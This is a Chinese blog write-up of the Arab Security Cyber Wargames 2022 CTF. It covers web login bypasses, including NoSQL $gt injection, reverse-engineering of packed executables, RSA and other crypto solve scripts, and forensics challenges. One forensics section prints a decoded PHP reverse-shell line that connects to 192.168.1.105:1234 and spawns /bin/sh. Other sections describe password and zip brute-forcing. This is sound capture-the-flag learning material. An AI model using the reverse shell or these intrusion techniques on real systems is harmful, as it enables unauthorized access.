---
title: Arab Security Cyber Wargames 2022
date: 2022-8-15 09:25:00
author: 美食家李老叭
img: https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153453.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF
categories: CTF
tags:
    - 比赛
---
本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。

Sometimes you win, sometimes you learn.

<!--more-->

说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。

## **1 Web**

### 1-1 **Drunken Developer**

本关为Web题目的第一题。网站给出了一个登陆界面，包含用户名和密码。查看网页源码发现其中嵌入了管理员的用户名，再没有其他信息的情况下首先用爆破的方法尝试。爆破出管理员密码后登陆进入即获得Flag。

![1-1-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-1.png)

![1-1-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/Ad5EXRN42DyBWy38v8uwGA.png)

登陆进入后获得Flag：`ASCWG{\%Sca21_QS_2\!3eSKC&qw9@_warmup}`

### 1-2 **Konan**

本题为Web题目的第二道题。

进入网站后是一个登陆页面，在输入用户名为admin或者root后会动画地跳出OTP(One Time Password)的输入框。但是我们没有其他获得OTP，而且主办方说了此题不涉及爆破，所以我们需要另寻它路。

**此题目展示了非常好的解决Web题目的思路：首先观察行为所生成的请求包和响应包的参数，然后在网页的js或者其他脚本源码中对参数进行搜索，从而获得前后端交互的API和逻辑。**

我们可以看到，在输入错误的OTP后，服务器端会返回存有errors和reason的响应包。在primary.js中搜索相关参数我们即可获得客户端的处理逻辑。                 

![1-2-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png)

由下可见，当服务器端的相应包中的errors参数为false时，客户端会生成Ticket并且访问/admin页面。

```js
## primary.js line 534
$(document).ready(function(){$('#subB').on('submit', function(e){e.preventDefault();if(firstTime){var dataSend=JSON.stringify({"user":$('#user').val()});}else{var dataSend=JSON.stringify({"OTP": $('#OTP').val()});}$.ajax({url: link,type: 'POST',data: dataSend,contentType: "application/json; charset=utf-8",success: function(data){if(data.exists == true){link='/otp/verify';firstTime=false;document.getElementById('username_label').style.display = 'none';document.getElementById('user').value = '';document.getElementById('user').type = 'hidden';document.getElementById('OTP_label').classList.toggle('appear');document.getElementById('OTP').type = 'text';} else if (data && data.errors == false) {CCas(CryptoJS.MD5('vverrriifiied'),CryptoJS.MD5('saxxx'),1222);window.location.href = '/admin'} else if (data && data.errors == true) {window.location.reload();} else if (data.exists == false) {document.getElementById('username_label').style.color = 'red';document.getElementById('username_label').innerHTML = 'Wrong username';}}});});});
```

访问页面即可得到最终的Flag。

![1-2-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/borgOLBQxPZepYHuRwcHdA.png)

### 1-3 **Doctor X [Aha!]**

Doctor X是Web题目中的第三题，当时并没有解决，所以仔细阅读了出题人的比赛后给出的[WriteUp](https://ahmed8magdy.medium.com/asc-wargames-qualifications-2022-web-challenge-write-up-dd19cb55d5eb)来查看自己思路上的欠缺。

Doctor X网站也是一个登陆系统的网站，只不过该网站是使用Angular框架书写，导致页面的客户端源码非常不好读。

![1-3-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151635.png)

通过注册和登陆后，我们可以进入到系统内部。系统内部显示了登陆用户的用户名，并且存在一个更新密码的逻辑。我一开始以为是XSS漏洞，毕竟用户名是用户可以操控的并且会回显。但是后来出题人在discord中给出线索，让我们专注于服务器端的漏洞。

因此，存在漏洞的地方应该就在更新密码的逻辑部分，如下所示。但是基于框架的客户端源码并不好读，所以我们也没有看出什么敏感的信息。

```
function SettingsComponent_form_5_div_6_Template(rf, ctx) { if (rf & 1) {
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementStart"](0, "div", 14)(1, "span");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtext"](2, "Old Password required ");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]()();
} }
function SettingsComponent_form_5_div_12_Template(rf, ctx) { if (rf & 1) {
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementStart"](0, "div", 14)(1, "span");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtext"](2, "New Password required");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]()();
} }
function SettingsComponent_form_5_Template(rf, ctx) { if (rf & 1) {
    const _r6 = _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵgetCurrentView"]();
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementStart"](0, "form", 4)(1, "div", 5)(2, "label", 6);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtext"](3, "Old Password");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]();
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelement"](4, "input", 7, 8);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtemplate"](6, SettingsComponent_form_5_div_6_Template, 3, 0, "div", 9);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]();
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementStart"](7, "div", 5)(8, "label", 10);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtext"](9, "New Password");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]();
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelement"](10, "input", 11, 12);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtemplate"](12, SettingsComponent_form_5_div_12_Template, 3, 0, "div", 9);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]();
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementStart"](13, "button", 13);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵlistener"]("click", function SettingsComponent_form_5_Template_button_click_13_listener() { _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵrestoreView"](_r6); const _r1 = _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵreference"](5); const _r3 = _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵreference"](11); const ctx_r5 = _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵnextContext"](); return _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵresetView"](ctx_r5.ChangeUserPassword(_r1.value, _r3.value)); });
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵtext"](14, "Update Password");
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵelementEnd"]()();
} if (rf & 2) {
    const ctx_r0 = _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵnextContext"]();
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵproperty"]("formGroup", ctx_r0.ChangePassword);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵadvance"](6);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵproperty"]("ngIf", (ctx_r0.ChangePassword.controls["oldpass"] == null ? null : ctx_r0.ChangePassword.controls["oldpass"].invalid) && (ctx_r0.ChangePassword.controls["oldpass"].dirty || ctx_r0.ChangePassword.controls["oldpass"].touched));
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵadvance"](6);
    _angular_core__WEBPACK_IMPORTED_MODULE_1__["ɵɵproperty"]("ngIf", ctx_r0.ChangePassword.controls["newpassword"].invalid && (ctx_r0.ChangePassword.controls["newpassword"].dirty || ctx_r0.ChangePassword.controls["newpassword"].touched));
} }
```

从WriteUp中我看到原来还可以直接通过F12->Application->Storage查看客户端存储的Cookie或者其他信息。原来漏洞点就在这里，客户端会根据当前用户ID和用户名访问不同的页面。当修改UserID为1，即admin时，则会进入admin的系统界面。

![1-3-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151705.png)

在admin的dashboard存在搜索所有用户及其密码的API。

![1-3-3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151722.png)

接着多输入一个}使其报错，通过报错信息查看数据库的一些基本信息。由下可以看到，数据库是nosql类型的，换句话说就是以键值对形式(json)存储的数据。

![1-3-4](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151742.png)

根据nosql注入的技巧，详见[HackTricks相关页面](https://book.hacktricks.xyz/pentesting-web/nosql-injection),我们可以使用$gt来获得所有用户的信息。最终自然flag也在其中。

![1-3-5](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151807.png)

## **2 Reverse**

### **2-1 Unpacking 101**

首先改题目提供了一个exe程序。程序的主题逻辑，为寻找程序中隐藏的第二个程序文件的位置，将第二个exe文件的内容以Loadexe()函数的形式加载到内存当中运行。

![2-1-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151824.png)

了解了这些，我们来看程序最关键的函数unpackFiles()，在这个函数中，提供了哈夫曼压缩、和简单的解密函数。初次阅读，本以为这些压缩算法和解密函数应用到解题过程中。为此，我多次修改了exe文件中指定位置存放的内容。

```c
 if ( binSignature == 1095125318 )
  {
    fread(&pdata, 0x110u, 1u, packArchive);
    printf("Extracting >>>> %s [%li]\n", pdata.filename, pdata.filesize);
    size = pdata.filesize;
    content = (UCHAR *)malloc(pdata.filesize);
    fread(content, size, 1u, packArchive);
    fclose(packArchive);
    keyProvided = pdata.key != 0;
    if ( pdata.parameter == 1 )
    {
      printf("\nDecompressing >>>> %s \n", pdata.filename);
      v4 = (HuffmanD *)operator new(0x280Cu);
      HuffmanD::HuffmanD(v4);
      huf = v4;
      outsize = HuffmanD::Decompress(v4, content, pdata.filesize);
      output = HuffmanD::getOutput(huf);
      decryptedContent = output;
    }
    else if ( pdata.parameter > 1 )
    {
      if ( pdata.parameter == 2 )
      {
        printf("\nDecrypting >>>> %s \n", pdata.filename);
        decryptedContent = (UCHAR *)malloc(size);
        if ( !keyProvided )
          decryptedContent = decryptFile(content, size);
        else
          decryptedContent = decryptFile(content, size, pdata.key);
        outsize = pdata.filesize;
      }
      else if ( pdata.parameter == 3 )
      {
        printf("\nDecompressing >>>> %s \n", pdata.filename);
        v5 = (HuffmanD *)operator new(0x280Cu);
        HuffmanD::HuffmanD(v5);
        huf = v5;
        outsize = HuffmanD::Decompress(v5, content, pdata.filesize);
        output = HuffmanD::getOutput(huf);
        decryptedContent = (UCHAR *)malloc(outsize);
        printf("\nDecrypting >>>> %s \n", pdata.filename);
        if ( !keyProvided )
          decryptedContent = decryptFile(output, outsize);
        else
          decryptedContent = decryptFile(output, outsize, pdata.key);
      }
    }
    else if ( !pdata.parameter )
    {
      outsize = pdata.filesize;
      decryptedContent = content;
    }
    printf("\nUnpacking Successful!\n\nExecuting from Memory >>>> %s [%i]\n", pdata.filename, outsize);
    LoadEXE(decryptedContent);
    result = 0;
}
```

但是由于fread(&pdata, 0x110u, 1u, packArchive);中pada读取的结构体的parameter变量为0. 所以我们猜测，隐藏的第二个exe内容并没有进行相应的压缩或者解密的处理。而是直接可以运行，双击程序运行显示的内容也和我们的猜想一致。

![2-1-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151854.png)

下图为pdata结构体读取的内容。

![2-1-3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151917.png)

之后的内容，也是一个exe文件的头的格式，既然运行loadexe的方式行不通，我选择先将隐藏exe文件的内容复制为新的文件，再用ida对其进行反编译。

![2-1-4](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151938.png)

![2-1-5](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152000.png)

发现其存在字符串对比的函数

```c
  for ( i = 0; i < 54; ++i )
  {
    if ( *((_BYTE *)&v10[7] + i) != *((_BYTE *)&v6 + i) )
    {
      sub_1181020("Wrong Flag :(\n");
      exit(0);
    }
  }
  sub_1181020("Correct Flag :)\n")
```

然后我们把断点打在循环开始之前，之后便在内存当中找到了flag的位置。

![2-1-6](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152024.png)

![2-1-7](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152056.png)

### 2-2 **PE Anatomy**

该题目提供了两个二进制文件，其中一个为Dont_run.bin，另一个为PE_Anatomy.exe。通过查看PE_Anatomy.exe文件的反编译代码，其主逻辑为通过读取Dont_run.bin中的特定位置的内容，并判断该位置是否符合if判断的条件，最终运行解密函数，将隐藏在其中的flag解密并显示出来。

![2-2-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152114.png)

关于读取Dont_run.bin特定位置的内容，进行if语句进行判断。我们需要根据if判断语句中的数值，基于其类型word还是dword亦或者是i_64等对Dont_run.bin中特定位置的内容进行修改。

由于修改的位置很多，所以我就不一一列举了。下面是一些例子：

![2-2-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152133.png)

![2-2-3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152150.png)

![2-2-4](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152206.png)

这个函数是for循环函数，这个函数不同于上面的if判断语句，可以直接修改内容。出题人绕了一个小弯，意图考察同学们对于地址知识的熟悉程度。

```c
    for ( i = 0; i < 3; ++i )
    {
      v35 = (__int64)&lpBuffer[10 * i + 66] + lpBuffer[15];
      if ( i )
      {
        if ( i == 1 )
        {
          v8 = "bbbbb";
          v9 = v35 - (_QWORD)"bbbbb";
          while ( 1 )
          {
            v10 = *v8;
            if ( *v8 != v8[v9] )
              break;
            ++v8;
            if ( !v10 )
            {
              v11 = 0;
              goto LABEL_53;
            }
          }
          v11 = v10 < (unsigned int)v8[v9] ? -1 : 1;
LABEL_53:
          if ( v11 )
            v33 = 1;
        }
      }
      else
      {
        v4 = "aaaaa";
        v5 = v35 - (_QWORD)"aaaaa";
        while ( 1 )
        {
          v6 = *v4;
          if ( *v4 != v4[v5] )
            break;
          ++v4;
          if ( !v6 )
          {
            v7 = 0;
            goto LABEL_44;
          }
        }
        v7 = v6 < (unsigned int)v4[v5] ? -1 : 1;
LABEL_44:
        if ( v7 )
          v33 = 1;
      }
      if ( i == 2 )
      {
        v12 = "joezid";
        v13 = v35 - (_QWORD)"joezid";
        while ( 1 )
        {
          v14 = *v12;
          if ( *v12 != v12[v13] )
            break;
          ++v12;
          if ( !v14 )
          {
            v15 = 0;
            goto LABEL_61;
          }
        }
        v15 = v14 < (unsigned int)v12[v13] ? -1 : 1;
LABEL_61:
        if ( v15 )
          v33 = 1;
      }
    }
    if ( !v33 )
    {
      phProv = 0i64;
      phHash = 0i64;
      pdwDataLen = 0;
      strcpy(v51, "0123456789abcdef");
      if ( CryptAcquireContextW(&phProv, 0i64, 0i64, 1u, 0xF0000000) )
      {
        if ( CryptCreateHash(phProv, 0x8003u, 0i64, 0, &phHash) )
        {
          if ( CryptHashData(phHash, (const BYTE *)lpBuffer, 0x400u, 0) )
          {
            pdwDataLen = 16;
            if ( CryptGetHashParam(phHash, 2u, pbData, &pdwDataLen, 0) )
            {
              sub_13F501060("Your Flag is : ASCWG{");
              for ( j = 0; j < pdwDataLen; ++j )
                sub_13F501060("%c%c", (unsigned int)v51[(int)pbData[j] >> 4], (unsigned int)v51[pbData[j] & 0xF]);
              sub_13F501060("}\n");
            }
            else
            {
              v32 = GetLastError();
              sub_13F501060("CryptGetHashParam failed: %d\n", v32);
            }
            CryptDestroyHash(phHash);
            CryptReleaseContext(phProv, 0);
            result = 1;
          }
          else
          {
            CryptReleaseContext(phProv, 0);
            CryptDestroyHash(phHash);
            result = 0;
          }
        }
        else
        {
          CryptReleaseContext(phProv, 0);
          result = 0;
        }
      }
      else
      {
        result = 0;
      }
    }
    else
    {
LABEL_78:
      sub_13F501060("No Flag for you ,Set Your Heart Ablaze to be able to see the flag.\n");
      result = 1;
    }
  }
```

为了不进入LABEL_78，就必须让v11为0。也就必须让*v8 = v8[v9]。

而 v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb"。

![2-2-5](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152227.png)

(_QWORD)"bbbbb" = 字符串bbbb存放的地址

v8 = 字符串bbbb存放的地址

![2-2-6](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152251.png)

![2-2-7](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152312.png)

所以综上分析得出 v8[v9]  = v35。所以，问题只要解决v35是什么。

v35 = (__int64)&lpBuffer[10 * i + 66] + lpBuffer[15];

lpBuffer[15] = lpBuffer + 15*4，该地址存放的内容为 0x 0000 0080h

 movsxd  rax, dword ptr [rax+3Ch] 可能是跟汇编中 dword ptr 有关，这个地址指向一个双字型数据

(__int64)&lpBuffer[10\*i + 66] = 第[10*i + 66]个元素在内存当中的首地址

但是按照这样的理解，和汇编代码就出现了不一致的情况。

汇编代码反映出来的是lpBuffer[15+10*i +66]，之所以乘28h，是因为0x28h = 40。

![2-2-8](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152332.png)

综合上面的分析呢，

v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb" = v35 = lpBuffer[15+10*i +66]

所以可以根据我们就可以去寻找特定位置处的存放的内容，并根据条件判断中的内容进行修改。

![2-2-9](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152352.png)

修改完毕之后，再次运行PE_Anatomy程序之后即能显示出来flag。

![2-2-10](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152414.png)

做了这个题，我有个看法但不知道对不对。我觉得汇编当中，凡是涉及到地址的相关计算，到最后都会对应到相应地址中存放的内容。而不是把计算之后的地址进行操作。

最后对以下在做题中遇到的指令的知识进行补充。

**movzx eax, word ptr [rax]**

![2-2-11](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152454.png)

**v34 = (char \*)lpBuffer + lpBuffer[15];**

![2-2-12](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152511.png)

通过对比汇编，可以发现  我之前对lpBuffer[15]的理解有问题。

![2-2-13](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152532.png)

正确的理解方式，lpbuffer[15] = lpbuffer + 15\*4（至于这里为什么是15\*4(0x3C)，是因为本身Ipbuffer 是int*类型的指针，也就是Ipbuffer变量所存储的64位地址指向了一个int类型的数组空间，int类型在64位下刚好占32位也就是4个字节。）

![2-2-14](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152553.png)

**a vs. a[0] vs. \*a  vs. &a vs. &a[0]**

参考此[帖子]( https://blog.csdn.net/baidu_37973494/article/details/83148520).

1. a，表示数组名；

    a做左值时表示整个数组的所有空间(10×4=40字节)，又因为C语言规定数组操作时要独立单个操作，不能整体操作数组，所以a不能做左值；

    a做右值表示数组首元素的首地址(首元素首地址就是数组的第0个元素的起始地址，也就是a[0]的起始地址)；

2. a[0]，表示数组的首元素，也就是数组的第0个元素；

    a[0]做左值时表示数组第0个元素对应的内存空间（连续4字节）；

    a[0]做右值时表示数组第0个元素的值（也就是数组第0个元素对应的内存空间中存储的那个数）；

3. &a，表示数组名a取地址，字面意思是数组的地址（数组的地址就是数组的首地址，也叫数组的起始地址）

    &a不能做左值，因为&a实质是一个常量，不是变量因此不能赋值，所以自然不能做左值；

    &a做右值时表示整个数组的首地址；

4. &a[0]，字面意思就是数组第0个元素的首地址（搞清楚[]和&的优先级，[]的优先级要高于&，所以a先和[]结合再取地址）；

    &a[0] 做左值时表示数组首元素首地址所对应的内存空间；

    &a[0] 做右值时等同于a。表示数组首元素的首地址；

## 3 **Crypto**

### 3-1 **RSA in the wild**

题目提供了以下一段程序和一段程序的输出，题目主要实现了一个 RSA 加密过程，但是其中每个人加密过程中的 N 不同，但是 P 相同，因此 P 是关键问题。

![3-1-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152621.png)

首先我们得知 N_i = P*Q_i ，因此可以通过 gcd 算法求个最大公约数，进而求得每个 N。在获得 e、p、q 便可以获得 d，再根据 RSA 加密解密算法，C = M^e(mod N)，M = C^d(mod N) 即可求出原始消息，最后将原始消息进行 long_to_bytes 求解即可，代码如下：

```py
def gcd(a,b):#求解最大公因数方法
    while(b!=0):
        if a%b==0:
           return b
        else:
            return gcd(b,a%b)
# 这里要注意的是，不知道为什么这四个数字当中两两存在共同的 P 而不是四个数有共同的 P
import libnum
N = [9019465093803586877472891652042526017244423267918585684572141459337752636017501282398583984846819147555479788255766221465302452334708306581657478087163498882790399392556915932241903819600243256898710512837026330099749891149718206725456165654975013707057350042189177818505148923810842478214626652504947902299,23938372162005523177999938438562451374665546708075664883194200608993841377868039780046395969369898805670203008718315917149246468698236445400730491330343376568175458641957123986113999188370741703681470314365261825831443108787421922073023609145294588353146041309964285454626205876016177576199911694583578054203,7492176105815056287406737107861152687669914817188441973876375606125509278843647128053495385472184164273276753734355681888283710630052589292533918258041321561584337044160204288159261124250897895150472928088930420119607423773142875636276401786832850472958085716356092462792054479554714349979034664376850407259,19226181445602743460246708025013176246822001005948560833211736039157554695246287037030410489087800335076044816379819628670911825715971233704410525113162113042540729331798511555022529148709471705473637189586448652726834752638590559219127165638752435997278633564685349397058307290548363125722837867180940021419]
messages = [1490803635449005835981793387807741830923148060654731278738509797435451285285034156065878921946571927216460900511251526914548382779631334897120457669789539503101428807041786196779372071069328112093285546177856847259662170258558289415211977744184992082066716124590295955026240499770848142550445898094801157061,6350249974685514311455731678779522359350354799468017596988644954406012738159501505851851861514932395179333372434804220392980343950894714606458923379054304802233466609403548752751709359872922491353578150109676550914201161697356048954377466378161795747517549045847439371181670308693139841054101664947749441303,2544223511735543039595079752083782272939464573374775456475586531619250161960313372895971808675158274512437185309522676978160116122909124405173644335952401335143161289490254404665940426997169777822971888908315046502903142588256830588219713706207832651682400227233863085882991692803261801301182265503150372301,12100625282820382536088469677465402939756857865013288698256765193122801312845842440176118885229553306158666539700152355154084650895509376550887918252093180450562973419960250796728283309496027020169076272415675948089735523228946553123649235016377673362851198236398841047345542435309022329198769047584615575574]
E = 0x10001


P1 = gcd(N[0], N[2])
P2 = gcd(N[1], N[3])
P = [P1, P2, P1, P2]
Q = []
for i in range(4):
    Q.append(N[i] // P[i]) 
    
for p, q, c, n in zip(P, Q, messages, N):
    phi = (p-1)*(q-1)
    d = libnum.invmod(E ,phi)
    m = pow(c, d, n)
    print(libnum.n2s(m))
```

然而对所有的进行解码后发现只有一句是有意义的，包含了 flag。

```
ASCWG{7h3_c0mM0n_9re4t_P0W3r_0f_6r0k3N_R$A}
```

### 3-2 **OSP**

题目提供了以下一段程序和一段程序的输出，通过使用 os.urandom 和 getPrime 实现随机的一次一密的加密方式，而解决问题的关键在于我们知道 flag 的格式为 ASCWG{xxx}。

![3-2-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152733.png)

首先我们知道每一行的输出为 f * p + k，而其中的 p 是固定的，因此我们首先求 p，我们把前三行分别对 65、83、67 进行求取整除法，可以得到可能的 p，接着我们可以得到如下三个数，利用简单的知识便可以得出 p 为第二个数字。

```
83801116101404762217959833436887689169125676463370468685179624854108613659566
83801116101404762217959833436887689169125676463370468685179624854108613659563 --> p
83801116101404762217959833436887689169125676463370468685179624854108613659565
```

求解出 p 之后，我们将每行分别对 p 求模，便可获得所谓随机的 k 值，进而逆向求解，便可以获得每行所对应的 f，在使用 chr 函数进行转换便可以获得 flag。

```
ASCWG{Wh47_1f_17's_N07_@_Pr1M3!-f0ffa3657e}
```

### 3-3 **Teaser [Aha!]**

题目提供了以下一段程序和一段程序的输出，该程序的关键在于先求解 x，接着求解 c1，c2，我们知道 flag 的格式为 ASCWG{xxx}。

![3-3-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152801.png)

这里我们首先可以利用 sympy 求解 x 的值，代码如下：

```py
import sympy
hint=6573544964235663795110387821358621068738264530355319754834598296204350028845729399053875214556575503920004379593112
a=12011053116152205388
b=11423234452039057359
x = sympy.Symbol('x')
solution = sympy.solve(x**5 + a*b*x**4 + b*x**3 - (a*b**2)*x**2 + (b*a**2)*x - (b**2)*(a**2)-hint ,x)
print(solution[0])
# x = 14794740941666750497
```

接着后面的就是参考了官方的 writeup，其中使用了 **SageMath** 代码如下：

```
F = Zmod(N)
PR.<c1, c2> = PolynomialRing(F)
f1 = x*a*c1 + b*c2 + a*b - q1
f2 = a*c2 - x*b*c1 + a*b - q2


I = Ideal([f1, f2])
I.groebner_basis()
# [c1 + 129605315639493448970075136922290937178908733835389122798667679999645002511918751225679112934299574414218902904120640354628679425092067997512344836684845210103107098629862452090849238650480459973169748953515560552426758751304034613294461809691584124214680152686132787281209362547560156811179702797894368189923, c2 + 16301823837274342549830986630234325738949194338370818370588794724975224426894656835985621236373909782588949334404482254039646785783224270540302423929586850992446342322491817804966558550730248640999810574168456842642895073832374078601103825246815150330281607599953134437905377383158998850822351263862695676571]
# 接着我们求得了 c1 + 129...(mod N)=0 以及 c2 + 163...(mod N) =0 进而根据以下内容求解
C1 = F(-129605315639493448970075136922290937178908733835389122798667679999645002511918751225679112934299574414218902904120640354628679425092067997512344836684845210103107098629862452090849238650480459973169748953515560552426758751304034613294461809691584124214680152686132787281209362547560156811179702797894368189923)
C2 = F(-16301823837274342549830986630234325738949194338370818370588794724975224426894656835985621236373909782588949334404482254039646785783224270540302423929586850992446342322491817804966558550730248640999810574168456842642895073832374078601103825246815150330281607599953134437905377383158998850822351263862695676571)
print(int.to_bytes(int(F(C1*C2)), 64, 'big'))
```

```
ASCWG{8r4in_T3s$s1n9_7h3_Ba51s_0f_9r036n3r}
```

## 4 Forensics

### 4-1 **warmup #1**

![4-1-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152836.png)

```
ASCWG{7b4be24b7e1f4ef01ebb62fce8fe3470857edaf7}
```

### 4-2 **warmup #2**

本关是一道jpg图片隐写的题目。首先仔细观察图片，发现上方存在类似于马赛克的图样，猜测是将flag以某种形式编码(url, base64, ascii或者不同进制下的ascii)后直接写入。查看后发现果然是通过url编码的方式把shell命令写入了图片。根据题目的要求把目标地址的sha1sum的哈希值作为flag上传。

当然出题人的WriteUp是直接使用strings查看图片中的所有字符串，这样也是同样可以的。

![4-2-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152858.png)

url解码后得到： `$sock=fsockopen("192.168.1.105",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

![4-2-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152921.png)

```
ASCWG{cc0e30c2dc233fc58591c987c4eaf751ff25132b}
```

### 4-3 **WeirdFS**

本题目给出的一个img镜像文件。首先通过通过fdisk文件查看该硬盘的格式信息，发现时Apple的APFS格式，因此直接在本机上挂载读入。

![4-3-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152945.png)   

发现了一个有密码的zip文件，其中含有Flag.txt文件。一开始观察zip文件发现其是真加密，并不是考察zip伪加密。所以我们开始打开硬盘下的所有隐藏文件开始寻找zip的密码。但是把所有看似像密码的的字符串尝试后发现都无法打开zip文件。

![4-3-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153005.png)

最后决定爆破zip文件。这里采用的是John the Ripper密码破解工具，词表选择rockyou.txt，很快就爆破出了密码。

![4-3-3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153030.png)

![4-3-4](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153054.png)

```
ASCWG{M4C_4N6_1$_Co0l}
```

### 4-4 **Persistent Ghost [Aha!]**

本题目是关于Windows下通过注册表持久化的题目，比赛时因为对注册表没有过多了解就跳过了。现在拿到Writeup之后转过头来研究一下。

**什么是注册表？**

注册表是Windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着Windows的启动、硬件驱动程序的装载以及一些Windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。

**注册表中的键根**

- HKEY_CLASSES_ROOT：启动应用程序所需的全部信息，如扩展名，应用程序与文档之间的关系，驱动程序名，DDE和OLE信息，类ID编号和应用程序与文档的图标等。
- HKEY_CURRENT_USER：当前登录用户的配置信息，如环境变量，个人程序以及桌面设置等。
- HKEY_LOCAL_MACHINE：本地计算机的系统信息，如硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息。
- HKEY_USERS：计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问。
- HKEY_CURRENT_CONFIG：当前硬件的配置信息，其中的信息是从HKEY_LOCAL_MACHINE中映射出来的。

题目给出了HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE中的信息，并且给出HKLM中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager信息存储到单独的Manager.txt中作为线索。

在Manager.txt我们可以发现一个被base64编码的png图片，如下所示。估计是暗示我们这是一个ribbit hole(新大陆)，flag应该以base64的方式存储在注册表中与持久化相关的键中。

![4-4-1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153123.png)

